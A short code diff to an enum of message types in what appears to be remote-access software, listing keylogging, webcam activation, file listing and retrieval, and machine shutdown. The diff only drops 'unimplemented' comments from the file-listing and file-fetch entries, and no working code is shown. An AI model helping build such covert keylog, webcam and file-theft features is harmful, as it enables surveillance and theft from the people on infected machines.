@@ -11,8 +11,8 @@ enum MessageEnum {
     MessageEnableKeylog,
     MessageDisableKeylog,
     MessageInvokeWebcam,
-    MessageListFile,        //unimplemented
-    MessageGetFile,         //unimplemented
+    MessageListFile,        
+    MessageGetFile,         
     MessageDeleteFile,      //unimplemented
     MessageShutdownMachine,
     MessageRestartMachine,
